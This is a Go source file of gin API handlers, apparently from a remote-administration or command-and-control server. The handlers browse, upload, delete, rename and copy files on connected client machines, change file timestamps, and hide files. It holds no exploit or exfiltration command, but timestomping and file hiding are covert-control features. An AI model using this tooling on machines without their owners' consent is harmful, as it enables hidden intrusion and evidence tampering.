package api

import (
	"BackendTemplate/pkg/command"
	"BackendTemplate/pkg/connection"
	"BackendTemplate/pkg/sendcommand"
	"BackendTemplate/pkg/utils"
	"context"
	"encoding/binary"
	"io"
	"log"

	"net/http"
	"strconv"
	"strings"
	"time"

	"github.com/gin-gonic/gin"
)

// ===== client_files(拆分自原 clients.go) =====

func FileBrowse(c *gin.Context) {
	var fileBody struct {
		Uid     string `json:"uid"`
		DirPath string `json:"dirPath"`
	}
	if err := c.ShouldBindJSON(&fileBody); err != nil {
		c.JSON(http.StatusBadRequest, gin.H{"error": err.Error()})
		return
	}
	if fileBody.DirPath == "" {
		c.JSON(http.StatusBadRequest, gin.H{"error": "dirPath is empty"})
		return
	}

	// 路径校验（危险路径防御）
	if msg := ValidateDangerousPath(fileBody.DirPath); msg != "" {
		c.JSON(http.StatusBadRequest, gin.H{"error": "路径非法: " + msg})
		return
	}

	// 检查客户端连接状态
	connection.MuClientListenerType.Lock()
	_, exists := connection.ClientListenerType[fileBody.Uid]
	connection.MuClientListenerType.Unlock()

	if !exists {
		log.Printf("FileBrowse failed - Client not connected: %s", fileBody.Uid)
		c.JSON(http.StatusBadRequest, gin.H{
			"error":        "客户端未连接或已断开连接，请刷新客户端列表并重新选择",
			"disconnected": true,
			"uid":          fileBody.Uid,
		})
		return
	}

	// 添加日志记录
	log.Printf("FileBrowse request - UID: %s, DirPath: %s", fileBody.Uid, fileBody.DirPath)

	queue := command.VarFileBrowserQueue.GetOrCreateQueue(fileBody.Uid)
	if strings.HasSuffix(fileBody.DirPath, ":") {
		fileBody.DirPath += "/"
	}

	// 发送命令到客户端
	sendcommand.SendCommand(fileBody.Uid, "filebrowse "+fileBody.DirPath)

	// 创建一个 context 并设置更严格的超时时间（文件浏览30秒）
	ctx, cancel := context.WithTimeout(context.Background(), 30*time.Second)
	defer cancel()

	// 等待从通道接收文件列表
	select {
	case fileBrowseStr := <-queue:
		log.Printf("FileBrowse response received for UID: %s, length: %d", fileBody.Uid, len(fileBrowseStr))

		// 检查客户端连接是否仍然活跃
		if c.IsAborted() {
			log.Printf("Client connection aborted for UID: %s", fileBody.Uid)
			return
		}

		fileTree := command.ParseDirectoryString(fileBody.Uid, fileBrowseStr)

		// 检查响应数据大小，如果过大则进行分页或限制
		if len(fileBrowseStr) > 1024*1024 { // 1MB限制
			log.Printf("Large response detected (%d bytes), may cause connection issues", len(fileBrowseStr))
			// 可以在这里实现数据分页或压缩
		}

		// 设置适当的响应头以优化传输
		c.Header("Content-Type", "application/json; charset=utf-8")
		c.Header("Cache-Control", "no-cache")

		c.JSON(http.StatusOK, gin.H{"status": http.StatusOK, "data": fileTree})
	case <-command.GetClientOfflineSignal(fileBody.Uid):
		c.JSON(http.StatusRequestTimeout, gin.H{"error": "客户端已离线"})
		return
	case <-ctx.Done():
		log.Printf("FileBrowse timeout for UID: %s, DirPath: %s", fileBody.Uid, fileBody.DirPath)
		// 返回更友好的错误信息
		c.JSON(http.StatusRequestTimeout, gin.H{
			"error":   "文件浏览请求超时，可能是目录文件过多或网络延迟。请稍后重试或尝试访问子目录。",
			"timeout": true,
			"path":    fileBody.DirPath,
		})
	}
}

func FileDelete(c *gin.Context) {
	var fileBody struct {
		Uid      string `json:"uid"`
		FilePath string `json:"filePath"`
	}
	if err := c.ShouldBindJSON(&fileBody); err != nil {
		c.JSON(http.StatusBadRequest, gin.H{"error": err.Error()})
		return
	}

	// 检查客户端连接状态
	connection.MuClientListenerType.Lock()
	_, exists := connection.ClientListenerType[fileBody.Uid]
	connection.MuClientListenerType.Unlock()

	if !exists {
		log.Printf("FileDelete failed - Client not connected: %s", fileBody.Uid)
		c.JSON(http.StatusBadRequest, gin.H{
			"error":        "客户端未连接或已断开连接，无法执行删除操作",
			"disconnected": true,
			"uid":          fileBody.Uid,
		})
		return
	}

	// 路径校验（危险路径防御）
	if msg := ValidateDangerousPath(fileBody.FilePath); msg != "" {
		c.JSON(http.StatusBadRequest, gin.H{"error": "路径非法: " + msg})
		return
	}

	// 发送删除文件命令（使用正确的命令格式）
	sendcommand.SendCommand(fileBody.Uid, "rm "+fileBody.FilePath)

	queue := command.VarFileBrowserQueue.GetOrCreateQueue(fileBody.Uid)

	var dirPath string
	lastSlashIndex := strings.LastIndexAny(fileBody.FilePath, "/\\")
	if lastSlashIndex != -1 {
		dirPath = fileBody.FilePath[:lastSlashIndex+1]
	}
	sendcommand.SendCommand(fileBody.Uid, "filebrowse "+dirPath)

	// 创建一个 context 并设置更严格的超时时间（删除操作10秒）
	ctx, cancel := context.WithTimeout(context.Background(), 10*time.Second)
	defer cancel()

	// 等待从通道接收 PID 列表
	select {
	case fileBrowseStr := <-queue:
		fileTree := command.ParseDirectoryString(fileBody.Uid, fileBrowseStr)
		c.JSON(http.StatusOK, gin.H{"status": http.StatusOK, "data": fileTree})
	case <-command.GetClientOfflineSignal(fileBody.Uid):
		c.JSON(http.StatusRequestTimeout, gin.H{"error": "客户端已离线"})
		return
	case <-ctx.Done():
		c.JSON(http.StatusRequestTimeout, gin.H{"error": "timeout"})
	}
}

func MakeDir(c *gin.Context) {
	var dirBody struct {
		Uid     string `json:"uid"`
		DirPath string `json:"dirPath"`
	}
	if err := c.ShouldBindJSON(&dirBody); err != nil {
		c.JSON(http.StatusBadRequest, gin.H{"error": err.Error()})
		return
	}

	// 路径校验（危险路径防御）
	if msg := ValidateDangerousPath(dirBody.DirPath); msg != "" {
		c.JSON(http.StatusBadRequest, gin.H{"error": "路径非法: " + msg})
		return
	}

	// 检查客户端连接状态
	connection.MuClientListenerType.Lock()
	_, exists := connection.ClientListenerType[dirBody.Uid]
	connection.MuClientListenerType.Unlock()

	if !exists {
		log.Printf("MakeDir failed - Client not connected: %s", dirBody.Uid)
		c.JSON(http.StatusBadRequest, gin.H{
			"error":        "客户端未连接或已断开连接，无法创建目录",
			"disconnected": true,
			"uid":          dirBody.Uid,
		})
		return
	}
	sendcommand.SendCommand(dirBody.Uid, "mkdir "+dirBody.DirPath)

	queue := command.VarFileBrowserQueue.GetOrCreateQueue(dirBody.Uid)

	var dirPath string
	lastSlashIndex := strings.LastIndexAny(dirBody.DirPath, "/\\")
	if lastSlashIndex != -1 {
		dirPath = dirBody.DirPath[:lastSlashIndex+1]
	}
	sendcommand.SendCommand(dirBody.Uid, "filebrowse "+dirPath)

	// 创建一个 context 并设置更严格的超时时间（创建目录10秒）
	ctx, cancel := context.WithTimeout(context.Background(), 10*time.Second)
	defer cancel()

	// 等待从通道接收 PID 列表
	select {
	case fileBrowseStr := <-queue:
		fileTree := command.ParseDirectoryString(dirBody.Uid, fileBrowseStr)
		c.JSON(http.StatusOK, gin.H{"status": http.StatusOK, "data": fileTree})
	case <-command.GetClientOfflineSignal(dirBody.Uid):
		c.JSON(http.StatusRequestTimeout, gin.H{"error": "客户端已离线"})
		return
	case <-ctx.Done():
		c.JSON(http.StatusRequestTimeout, gin.H{"error": "timeout"})
	}
}

func FileUpload(c *gin.Context) {
	// 请求体上限在 main.go 的 MaxBodyBytesMiddlewareWithLimits 里按路径放宽到 500MB+1MB。
	// 这里原本以更大上限重新包一层 MaxBytesReader 并注释"覆盖生效"——那是错的：
	// 嵌套时生效的是内层较小的上限，外层只会把内层的 MaxBytesError 原样透传。
	file, _ := c.FormFile("file")
	if file == nil {
		c.JSON(http.StatusBadRequest, gin.H{"error": "No file uploaded"})
		return
	}

	// 1. 验证文件大小（500MB限制）
	const maxFileSize = 500 * 1024 * 1024 // 500MB
	if file.Size > maxFileSize {
		c.JSON(http.StatusBadRequest, gin.H{
			"error": "文件大小不能超过500MB",
			"code":  "FILE_SIZE_EXCEEDED",
			"size":  file.Size,
			"limit": maxFileSize,
		})
		return
	}

	// 2. 验证文件名安全性
	filename := file.Filename
	if len(filename) == 0 {
		c.JSON(http.StatusBadRequest, gin.H{"error": "文件名不能为空"})
		return
	}
	if len(filename) > 255 {
		c.JSON(http.StatusBadRequest, gin.H{"error": "文件名长度不能超过255个字符"})
		return
	}

	// 检查危险文件名字符
	dangerousChars := []string{"..", "//", "\\", ":", "<", ">", "|", "?", "*"}
	for _, char := range dangerousChars {
		if strings.Contains(filename, char) {
			c.JSON(http.StatusBadRequest, gin.H{"error": "文件名包含非法字符: " + char})
			return
		}
	}

	// 获取其他表单字段
	uid := c.PostForm("uid")
	uploadPath := c.PostForm("uploadPath")

	// 5. 验证必要参数
	if uid == "" {
		c.JSON(http.StatusBadRequest, gin.H{"error": "客户端UID不能为空"})
		return
	}
	if uploadPath == "" {
		c.JSON(http.StatusBadRequest, gin.H{"error": "上传路径不能为空"})
		return
	}

	// 6. 验证上传路径安全性（危险路径防御）
	if errMsg := ValidateDangerousPath(uploadPath); errMsg != "" {
		c.JSON(http.StatusBadRequest, gin.H{"error": "上传路径非法: " + errMsg})
		return
	}

	// 7. 检查客户端连接状态
	connection.MuClientListenerType.Lock()
	_, exists := connection.ClientListenerType[uid]
	connection.MuClientListenerType.Unlock()

	if !exists {
		log.Printf("文件上传失败 - 客户端未连接: %s", uid)
		c.JSON(http.StatusBadRequest, gin.H{
			"error":        "客户端未连接或已断开连接，无法上传文件",
			"code":         "CLIENT_NOT_CONNECTED",
			"disconnected": true,
			"uid":          uid,
		})
		return
	}

	// 8. 打开上传文件，流式分块下发（不再整包 ReadAll）
	src, err := file.Open()
	if err != nil {
		c.JSON(http.StatusInternalServerError, gin.H{"error": "Unable to open file"})
		return
	}
	defer src.Close()

	log.Printf("文件上传开始 - UID: %s, 文件: %s, 大小: %d字节", uid, filename, file.Size)

	// 9. 组装公共字段 + 流式分块发送
	requestId := nextRequestId()
	uploadPathBytes := []byte(uploadPath)
	uploadPathLenBytes := make([]byte, 4)
	binary.BigEndian.PutUint32(uploadPathLenBytes, uint32(len(uploadPathBytes)))

	const chunkSize = 1040500
	total := uint32((file.Size + chunkSize - 1) / chunkSize)
	if total == 0 {
		total = 1
	}

	ackCh := command.VarFileOpQueue.Create(uid, requestId)
	defer command.VarFileOpQueue.Remove(uid, requestId)

	buf := make([]byte, chunkSize)
	var seq uint32
	var written int64
	sendErr := error(nil)

	for seq < total {
		n, rerr := src.Read(buf)
		if n > 0 {
			cmdType := command.UploadStart
			if seq > 0 {
				cmdType = command.UploadLoop
			}
			cmdTypeBytes := make([]byte, 4)
			binary.BigEndian.PutUint32(cmdTypeBytes, uint32(cmdType))
			payload := utils.BytesCombine(
				utils.WriteInt(int(requestId)),
				uploadPathLenBytes, uploadPathBytes,
				utils.WriteInt(int(seq)), utils.WriteInt(int(total)),
				buf[:n],
			)
			byteToSend := append(cmdTypeBytes, payload...)
			sendcommand.SendFileUploadCommand(uid, byteToSend)
			written += int64(n)
			seq++
		}
		if rerr == io.EOF {
			break
		}
		if rerr != nil {
			sendErr = rerr
			break
		}
	}
	if sendErr != nil {
		log.Printf("文件上传读取失败 - UID: %s, 错误: %v", uid, sendErr)
		c.JSON(http.StatusInternalServerError, gin.H{"error": "读取文件失败: " + sendErr.Error()})
		return
	}
	if seq < total {
		// 实际读取字节数少于声明大小，修正 total
		total = seq
	}

	// 10. 等待客户端最终 ACK（全部块确认），保证"完成"语义真实
	timeout := time.After(120 * time.Second)
	acked := uint32(0)
	for acked < total {
		select {
		case ack := <-ackCh:
			_, aSeq, aTotal, ok := command.ParseUploadAck(ack)
			if ok {
				if aTotal == total {
					acked = total
				} else if aSeq+1 > acked {
					acked = aSeq + 1
				}
			}
		case <-timeout:
			log.Printf("文件上传超时 - UID: %s, 已确认 %d/%d 块", uid, acked, total)
			c.JSON(http.StatusRequestTimeout, gin.H{
				"error":    "上传超时，已确认 " + strconv.Itoa(int(acked)) + "/" + strconv.Itoa(int(total)) + " 块",
				"uploaded": written,
			})
			return
		}
	}

	log.Printf("文件上传完成 - UID: %s, 文件: %s, 总块数: %d, 字节: %d", uid, filename, total, written)
	c.JSON(http.StatusOK, gin.H{
		"status":   http.StatusOK,
		"message":  "文件上传完成",
		"filename": filename,
		"size":     written,
		"blocks":   total,
	})
}

func ListDrives(c *gin.Context) {
	var drivesBody struct {
		Uid string `form:"uid"`
	}
	if err := c.BindQuery(&drivesBody); err != nil {
		c.JSON(http.StatusBadRequest, gin.H{"error": err.Error()})
		return
	}

	// 添加日志记录
	log.Printf("ListDrives request - UID: %s", drivesBody.Uid)

	// 检查客户端连接状态
	connection.MuClientListenerType.Lock()
	_, exists := connection.ClientListenerType[drivesBody.Uid]
	connection.MuClientListenerType.Unlock()

	if !exists {
		log.Printf("客户端未连接: %s", drivesBody.Uid)
		c.JSON(http.StatusBadRequest, gin.H{
			"error": "客户端未连接，请确保客户端正在运行并已连接到服务器",
			"code":  "CLIENT_NOT_CONNECTED",
			"uid":   drivesBody.Uid,
		})
		return
	}

	queue := command.VarDrivesQueue.GetOrCreateQueue(drivesBody.Uid)

	sendcommand.SendCommand(drivesBody.Uid, "drives")

	// 更严格的超时设置（获取驱动啨30秒）
	ctx, cancel := context.WithTimeout(context.Background(), 30*time.Second)
	defer cancel()

	// 等待从通道接收驱动器列表
	select {
	case fileBrowseStr := <-queue:
		log.Printf("ListDrives response received for UID: %s, length: %d", drivesBody.Uid, len(fileBrowseStr))
		fileTree := command.ParseDrives(drivesBody.Uid, fileBrowseStr)
		c.JSON(http.StatusOK, gin.H{"status": http.StatusOK, "data": fileTree})
	case <-command.GetClientOfflineSignal(drivesBody.Uid):
		c.JSON(http.StatusRequestTimeout, gin.H{"error": "客户端已离线"})
		return
	case <-ctx.Done():
		log.Printf("ListDrives timeout for UID: %s", drivesBody.Uid)
		// 返回更友好的错误信息
		c.JSON(http.StatusRequestTimeout, gin.H{
			"error":   "获取驱动器列表超时，可能是网络连接不稳定。请检查客户端连接状态并重试。",
			"timeout": true,
		})
	}
}

// waitFileOpResult 等待客户端文件操作确认（FILE_OP_RESULT，超时 15s）

func waitFileOpResult(uid string, requestId uint32) (bool, string) {
	ch := command.VarFileOpQueue.Create(uid, requestId)
	defer command.VarFileOpQueue.Remove(uid, requestId)
	select {
	case data := <-ch:
		_, ok, msg, valid := command.ParseFileOpResult(data)
		if !valid {
			return false, "无效的操作结果"
		}
		return ok, msg
	case <-time.After(15 * time.Second):
		return false, "操作超时，客户端未确认"
	}
}

// CreateFile 新建空文件（等待客户端确认真实结果）

func CreateFile(c *gin.Context) {
	var fileBody struct {
		Uid      string `json:"uid"`
		FilePath string `json:"filePath"`
	}
	if err := c.BindJSON(&fileBody); err != nil {
		c.JSON(http.StatusBadRequest, gin.H{"error": err.Error()})
		return
	}

	// 路径校验（危险路径防御）
	if msg := ValidateDangerousPath(fileBody.FilePath); msg != "" {
		c.JSON(http.StatusBadRequest, gin.H{"error": "路径非法: " + msg})
		return
	}

	// 检查客户端连接状态
	connection.MuClientListenerType.Lock()
	_, exists := connection.ClientListenerType[fileBody.Uid]
	connection.MuClientListenerType.Unlock()

	if !exists {
		log.Printf("CreateFile failed - Client not connected: %s", fileBody.Uid)
		c.JSON(http.StatusBadRequest, gin.H{
			"error":        "客户端未连接或已断开连接，无法创建文件",
			"disconnected": true,
			"uid":          fileBody.Uid,
		})
		return
	}

	// 使用文件保存命令创建空文件（携带 requestId）
	requestId := nextRequestId()
	pathBytes := []byte(fileBody.FilePath)
	cmd := utils.BytesCombine(utils.WriteInt(int(requestId)), utils.WriteInt(len(pathBytes)), pathBytes, []byte(""))
	cmdTypeBytes := make([]byte, 4)
	binary.BigEndian.PutUint32(cmdTypeBytes, uint32(command.FILESAVE))
	byteToSend := append(cmdTypeBytes, cmd...)

	// 发送创建文件命令
	sendcommand.SendFileUploadCommand(fileBody.Uid, byteToSend)

	// 等待客户端确认真实结果
	ok, msg := waitFileOpResult(fileBody.Uid, requestId)
	if !ok {
		c.JSON(http.StatusBadGateway, gin.H{"error": "创建文件失败: " + msg})
		return
	}

	// 刷新文件列表
	queue := command.VarFileBrowserQueue.GetOrCreateQueue(fileBody.Uid)

	var dirPath string
	lastSlashIndex := strings.LastIndexAny(fileBody.FilePath, "/\\")
	if lastSlashIndex != -1 {
		dirPath = fileBody.FilePath[:lastSlashIndex+1]
	} else {
		dirPath = "/"
	}
	sendcommand.SendCommand(fileBody.Uid, "filebrowse "+dirPath)

	// 创建一个 context 并设置超时时间（创建文件10秒）
	ctx, cancel := context.WithTimeout(context.Background(), 10*time.Second)
	defer cancel()

	// 等待从通道接收文件列表
	select {
	case fileBrowseStr := <-queue:
		fileTree := command.ParseDirectoryString(fileBody.Uid, fileBrowseStr)
		c.JSON(http.StatusOK, gin.H{"status": http.StatusOK, "data": fileTree, "message": "文件创建成功"})
	case <-command.GetClientOfflineSignal(fileBody.Uid):
		c.JSON(http.StatusRequestTimeout, gin.H{"error": "客户端已离线"})
		return
	case <-ctx.Done():
		c.JSON(http.StatusOK, gin.H{"status": http.StatusOK, "message": "文件创建成功，但刷新文件列表超时"})
	}
}

// ModifyFileTime 修改文件的访问和修改时间（等待客户端确认）

func ModifyFileTime(c *gin.Context) {
	var timeBody struct {
		Uid      string `json:"uid"`
		FilePath string `json:"filePath"`
		NewTime  string `json:"newTime"` // ISO 8601 格式: 2023-01-01T12:00:00
	}
	if err := c.BindJSON(&timeBody); err != nil {
		c.JSON(http.StatusBadRequest, gin.H{"error": err.Error()})
		return
	}

	// 路径校验（危险路径防御）
	if msg := ValidateDangerousPath(timeBody.FilePath); msg != "" {
		c.JSON(http.StatusBadRequest, gin.H{"error": "路径非法: " + msg})
		return
	}

	// 检查客户端连接状态
	connection.MuClientListenerType.Lock()
	_, exists := connection.ClientListenerType[timeBody.Uid]
	connection.MuClientListenerType.Unlock()

	if !exists {
		log.Printf("ModifyFileTime failed - Client not connected: %s", timeBody.Uid)
		c.JSON(http.StatusBadRequest, gin.H{
			"error":        "客户端未连接或已断开连接，无法修改文件时间",
			"disconnected": true,
			"uid":          timeBody.Uid,
		})
		return
	}

	// 将时间字符串和文件路径编码为字节数组（携带 requestId）
	requestId := nextRequestId()
	timeBytes := []byte(timeBody.NewTime)
	pathBytes := []byte(timeBody.FilePath)
	timeLen := len(timeBytes)
	pathLen := len(pathBytes)
	timeLenBytes := make([]byte, 4)
	pathLenBytes := make([]byte, 4)
	binary.BigEndian.PutUint32(timeLenBytes, uint32(timeLen))
	binary.BigEndian.PutUint32(pathLenBytes, uint32(pathLen))

	// 组合 requestId、时间长度、时间、路径长度、路径
	cmd := utils.BytesCombine(utils.WriteInt(int(requestId)), timeLenBytes, timeBytes, pathLenBytes, pathBytes)
	cmdTypeBytes := make([]byte, 4)
	binary.BigEndian.PutUint32(cmdTypeBytes, uint32(command.MODIFYTIME))
	byteToSend := append(cmdTypeBytes, cmd...)

	// 发送修改时间命令
	sendcommand.SendFileUploadCommand(timeBody.Uid, byteToSend)

	// 等待客户端确认真实结果
	ok, msg := waitFileOpResult(timeBody.Uid, requestId)
	if !ok {
		c.JSON(http.StatusBadGateway, gin.H{"error": "修改时间失败: " + msg})
		return
	}
	c.JSON(http.StatusOK, gin.H{"status": http.StatusOK, "message": msg})
}

// HideFile 隐藏文件或目录

func HideFile(c *gin.Context) {
	var hideBody struct {
		Uid      string `json:"uid"`
		FilePath string `json:"filePath"`
	}
	if err := c.BindJSON(&hideBody); err != nil {
		c.JSON(http.StatusBadRequest, gin.H{"error": err.Error()})
		return
	}

	// 检查客户端连接状态
	connection.MuClientListenerType.Lock()
	_, exists := connection.ClientListenerType[hideBody.Uid]
	connection.MuClientListenerType.Unlock()

	if !exists {
		log.Printf("HideFile failed - Client not connected: %s", hideBody.Uid)
		c.JSON(http.StatusBadRequest, gin.H{
			"error":        "客户端未连接或已断开连接，无法隐藏文件",
			"disconnected": true,
			"uid":          hideBody.Uid,
		})
		return
	}

	// 将文件路径编码为字节数组（携带 requestId）
	requestId := nextRequestId()
	pathBytes := []byte(hideBody.FilePath)
	pathLen := len(pathBytes)
	pathLenBytes := make([]byte, 4)
	binary.BigEndian.PutUint32(pathLenBytes, uint32(pathLen))

	// 组合路径长度和路径
	cmd := utils.BytesCombine(utils.WriteInt(int(requestId)), pathLenBytes, pathBytes)
	cmdTypeBytes := make([]byte, 4)
	binary.BigEndian.PutUint32(cmdTypeBytes, uint32(command.HIDEFILE))
	byteToSend := append(cmdTypeBytes, cmd...)

	// 发送隐藏文件命令
	sendcommand.SendFileUploadCommand(hideBody.Uid, byteToSend)

	// 等待客户端确认真实结果
	ok, msg := waitFileOpResult(hideBody.Uid, requestId)
	if !ok {
		c.JSON(http.StatusBadGateway, gin.H{"error": "隐藏文件失败: " + msg})
		return
	}

	// 刷新文件列表
	queue := command.VarFileBrowserQueue.GetOrCreateQueue(hideBody.Uid)

	var dirPath string
	lastSlashIndex := strings.LastIndexAny(hideBody.FilePath, "/\\")
	if lastSlashIndex != -1 {
		dirPath = hideBody.FilePath[:lastSlashIndex+1]
	} else {
		dirPath = "/"
	}
	sendcommand.SendCommand(hideBody.Uid, "filebrowse "+dirPath)

	// 创建一个 context 并设置超时时间（隐藏文件10秒）
	ctx, cancel := context.WithTimeout(context.Background(), 10*time.Second)
	defer cancel()

	// 等待从通道接收文件列表
	select {
	case fileBrowseStr := <-queue:
		fileTree := command.ParseDirectoryString(hideBody.Uid, fileBrowseStr)
		c.JSON(http.StatusOK, gin.H{"status": http.StatusOK, "data": fileTree, "message": "文件隐藏成功"})
	case <-command.GetClientOfflineSignal(hideBody.Uid):
		c.JSON(http.StatusRequestTimeout, gin.H{"error": "客户端已离线"})
		return
	case <-ctx.Done():
		c.JSON(http.StatusOK, gin.H{"status": http.StatusOK, "message": "文件隐藏成功，但刷新文件列表超时"})
	}
}

// UnhideFile 取消隐藏文件或目录

func UnhideFile(c *gin.Context) {
	var unhideBody struct {
		Uid      string `json:"uid"`
		FilePath string `json:"filePath"`
	}
	if err := c.BindJSON(&unhideBody); err != nil {
		c.JSON(http.StatusBadRequest, gin.H{"error": err.Error()})
		return
	}

	// 检查客户端连接状态
	connection.MuClientListenerType.Lock()
	_, exists := connection.ClientListenerType[unhideBody.Uid]
	connection.MuClientListenerType.Unlock()

	if !exists {
		log.Printf("UnhideFile failed - Client not connected: %s", unhideBody.Uid)
		c.JSON(http.StatusBadRequest, gin.H{
			"error":        "客户端未连接或已断开连接，无法取消隐藏文件",
			"disconnected": true,
			"uid":          unhideBody.Uid,
		})
		return
	}

	// 将文件路径编码为字节数组（携带 requestId）
	requestId := nextRequestId()
	pathBytes := []byte(unhideBody.FilePath)
	pathLen := len(pathBytes)
	pathLenBytes := make([]byte, 4)
	binary.BigEndian.PutUint32(pathLenBytes, uint32(pathLen))

	// 组合路径长度和路径
	cmd := utils.BytesCombine(utils.WriteInt(int(requestId)), pathLenBytes, pathBytes)
	cmdTypeBytes := make([]byte, 4)
	binary.BigEndian.PutUint32(cmdTypeBytes, uint32(command.UNHIDEFILE))
	byteToSend := append(cmdTypeBytes, cmd...)

	// 发送取消隐藏文件命令
	sendcommand.SendFileUploadCommand(unhideBody.Uid, byteToSend)

	// 等待客户端确认真实结果
	ok, msg := waitFileOpResult(unhideBody.Uid, requestId)
	if !ok {
		c.JSON(http.StatusBadGateway, gin.H{"error": "取消隐藏失败: " + msg})
		return
	}

	// 刷新文件列表
	queue := command.VarFileBrowserQueue.GetOrCreateQueue(unhideBody.Uid)

	var dirPath string
	lastSlashIndex := strings.LastIndexAny(unhideBody.FilePath, "/\\")
	if lastSlashIndex != -1 {
		dirPath = unhideBody.FilePath[:lastSlashIndex+1]
	} else {
		dirPath = "/"
	}
	sendcommand.SendCommand(unhideBody.Uid, "filebrowse "+dirPath)

	// 创建一个 context 并设置超时时间（取消隐藏文件10秒）
	ctx, cancel := context.WithTimeout(context.Background(), 10*time.Second)
	defer cancel()

	// 等待从通道接收文件列表
	select {
	case fileBrowseStr := <-queue:
		fileTree := command.ParseDirectoryString(unhideBody.Uid, fileBrowseStr)
		c.JSON(http.StatusOK, gin.H{"status": http.StatusOK, "data": fileTree, "message": "取消隐藏成功"})
	case <-command.GetClientOfflineSignal(unhideBody.Uid):
		c.JSON(http.StatusRequestTimeout, gin.H{"error": "客户端已离线"})
		return
	case <-ctx.Done():
		c.JSON(http.StatusOK, gin.H{"status": http.StatusOK, "message": "取消隐藏成功，但刷新文件列表超时"})
	}
}

// RenameFile 重命名文件或目录

func RenameFile(c *gin.Context) {
	var renameBody struct {
		Uid     string `json:"uid"`
		OldPath string `json:"oldPath"`
		NewPath string `json:"newPath"`
	}
	if err := c.BindJSON(&renameBody); err != nil {
		c.JSON(http.StatusBadRequest, gin.H{"error": err.Error()})
		return
	}

	// 路径校验（危险路径防御）
	if msg := ValidateDangerousPath(renameBody.OldPath); msg != "" {
		c.JSON(http.StatusBadRequest, gin.H{"error": "旧路径非法: " + msg})
		return
	}
	if msg := ValidateDangerousPath(renameBody.NewPath); msg != "" {
		c.JSON(http.StatusBadRequest, gin.H{"error": "新路径非法: " + msg})
		return
	}

	// 将旧路径和新路径编码为字节数组（携带 requestId）
	requestId := nextRequestId()
	oldPathBytes := []byte(renameBody.OldPath)
	newPathBytes := []byte(renameBody.NewPath)
	oldPathLen := len(oldPathBytes)
	newPathLen := len(newPathBytes)
	oldPathLenBytes := make([]byte, 4)
	newPathLenBytes := make([]byte, 4)
	binary.BigEndian.PutUint32(oldPathLenBytes, uint32(oldPathLen))
	binary.BigEndian.PutUint32(newPathLenBytes, uint32(newPathLen))

	// 组合 requestId、旧路径长度、旧路径、新路径长度、新路径
	cmd := utils.BytesCombine(utils.WriteInt(int(requestId)), oldPathLenBytes, oldPathBytes, newPathLenBytes, newPathBytes)
	cmdTypeBytes := make([]byte, 4)
	binary.BigEndian.PutUint32(cmdTypeBytes, uint32(command.MV))
	byteToSend := append(cmdTypeBytes, cmd...)

	// 发送重命名命令
	sendcommand.SendFileUploadCommand(renameBody.Uid, byteToSend)

	// 等待客户端确认真实结果
	ok, msg := waitFileOpResult(renameBody.Uid, requestId)
	if !ok {
		c.JSON(http.StatusBadGateway, gin.H{"error": "重命名失败: " + msg})
		return
	}

	// 等待命令执行后刷新文件列表
	queue := command.VarFileBrowserQueue.GetOrCreateQueue(renameBody.Uid)

	var dirPath string
	lastSlashIndex := strings.LastIndexAny(renameBody.OldPath, "/\\")
	if lastSlashIndex != -1 {
		dirPath = renameBody.OldPath[:lastSlashIndex+1]
	}
	sendcommand.SendCommand(renameBody.Uid, "filebrowse "+dirPath)

	// 创建一个 context 并设置超时时间（重命名操作10秒）
	ctx, cancel := context.WithTimeout(context.Background(), 10*time.Second)
	defer cancel()

	// 等待从通道接收文件列表
	select {
	case fileBrowseStr := <-queue:
		fileTree := command.ParseDirectoryString(renameBody.Uid, fileBrowseStr)
		c.JSON(http.StatusOK, gin.H{"status": http.StatusOK, "data": fileTree, "message": "文件重命名成功"})
	case <-command.GetClientOfflineSignal(renameBody.Uid):
		c.JSON(http.StatusRequestTimeout, gin.H{"error": "客户端已离线"})
		return
	case <-ctx.Done():
		c.JSON(http.StatusOK, gin.H{"status": http.StatusOK, "message": "重命名成功，但刷新文件列表超时"})
	}
}

func CopyFile(c *gin.Context) {
	var copyBody struct {
		Uid     string `json:"uid"`
		OldPath string `json:"oldPath"`
		NewPath string `json:"newPath"`
	}
	if err := c.BindJSON(&copyBody); err != nil {
		c.JSON(http.StatusBadRequest, gin.H{"error": err.Error()})
		return
	}

	// 路径校验（危险路径防御）
	if msg := ValidateDangerousPath(copyBody.OldPath); msg != "" {
		c.JSON(http.StatusBadRequest, gin.H{"error": "源路径非法: " + msg})
		return
	}
	if msg := ValidateDangerousPath(copyBody.NewPath); msg != "" {
		c.JSON(http.StatusBadRequest, gin.H{"error": "目标路径非法: " + msg})
		return
	}

	requestId := nextRequestId()
	oldPathBytes := []byte(copyBody.OldPath)
	newPathBytes := []byte(copyBody.NewPath)
	oldPathLenBytes := make([]byte, 4)
	newPathLenBytes := make([]byte, 4)
	binary.BigEndian.PutUint32(oldPathLenBytes, uint32(len(oldPathBytes)))
	binary.BigEndian.PutUint32(newPathLenBytes, uint32(len(newPathBytes)))

	cmd := utils.BytesCombine(utils.WriteInt(int(requestId)), oldPathLenBytes, oldPathBytes, newPathLenBytes, newPathBytes)
	cmdTypeBytes := make([]byte, 4)
	binary.BigEndian.PutUint32(cmdTypeBytes, uint32(command.CP))
	byteToSend := append(cmdTypeBytes, cmd...)

	sendcommand.SendFileUploadCommand(copyBody.Uid, byteToSend)

	ok, msg := waitFileOpResult(copyBody.Uid, requestId)
	if !ok {
		c.JSON(http.StatusBadGateway, gin.H{"error": "复制失败: " + msg})
		return
	}

	// 等待命令执行后刷新文件列表
	queue := command.VarFileBrowserQueue.GetOrCreateQueue(copyBody.Uid)
	var dirPath string
	if lastSlashIndex := strings.LastIndexAny(copyBody.OldPath, "/\\"); lastSlashIndex != -1 {
		dirPath = copyBody.OldPath[:lastSlashIndex+1]
	}
	sendcommand.SendCommand(copyBody.Uid, "filebrowse "+dirPath)

	ctx, cancel := context.WithTimeout(context.Background(), 10*time.Second)
	defer cancel()
	select {
	case fileBrowseStr := <-queue:
		fileTree := command.ParseDirectoryString(copyBody.Uid, fileBrowseStr)
		c.JSON(http.StatusOK, gin.H{"status": http.StatusOK, "data": fileTree, "message": "复制成功"})
	case <-command.GetClientOfflineSignal(copyBody.Uid):
		c.JSON(http.StatusRequestTimeout, gin.H{"error": "客户端已离线"})
		return
	case <-ctx.Done():
		c.JSON(http.StatusOK, gin.H{"status": http.StatusOK, "message": "复制成功，但刷新文件列表超时"})
	}
}

// requestIdCounter 请求 ID 原子计数器（替代 math/rand，避免碰撞导致响应错配）
var requestIdCounter uint32

// nextRequestId 生成全局递增的 requestId
